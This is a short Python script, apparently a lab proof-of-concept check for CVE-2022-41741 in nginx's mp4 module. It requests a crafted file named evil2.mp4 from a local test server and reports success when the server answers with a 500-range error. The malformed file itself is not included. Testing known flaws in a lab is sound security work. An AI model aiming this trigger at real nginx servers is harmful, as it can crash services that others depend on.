#!/usr/bin/env python3
import requests
import sys
LAB = "/home/vita/nginx-poc-lab"
url = "http://127.0.0.1:41741/evil2.mp4"
r = requests.get(url, params={"start": "0"}, headers={"User-Agent": "PoCLab/CVE-2022-41741"}, timeout=10)
print("status", r.status_code)
sys.exit(0 if r.status_code in (500, 502, 503) else 1)
